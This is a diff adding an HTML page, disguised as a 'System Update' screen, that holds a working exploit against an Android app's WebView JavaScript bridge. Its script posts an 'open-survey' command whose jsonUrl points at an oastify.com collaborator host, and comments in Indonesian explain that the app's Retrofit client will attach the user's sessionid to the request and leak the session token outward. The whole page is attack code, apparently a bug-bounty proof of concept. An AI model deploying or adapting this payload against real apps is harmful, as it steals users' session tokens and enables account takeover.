@@ -1,0 +1,19 @@
+<html>
+     <body>
+          <h1>System Update...</h1>
+          <script>
+              // Menunggu sebentar agar WebView selesai inisialisasi
+              setTimeout(function() {
+                  if (window.AndroidMessageHandler) {
+                      // Perintah ini akan memicu layar survei internal
+                      // Layar survei ini menggunakan Retrofit untuk memuat jsonUrl
+                      // Retrofit akan MENYERTAKAN sessionid secara otomatis!
+                      AndroidMessageHandler.postMessage(JSON.stringify({
+                          "command": "open-survey",
+                          "jsonUrl": "https://9blbud2clhjcxqjmbz6axauh1874vujj.oastify.com/leaked-token"
+                      }));
+                  }
+              }, 1000);
+          </script>
+     </body>
+</html>
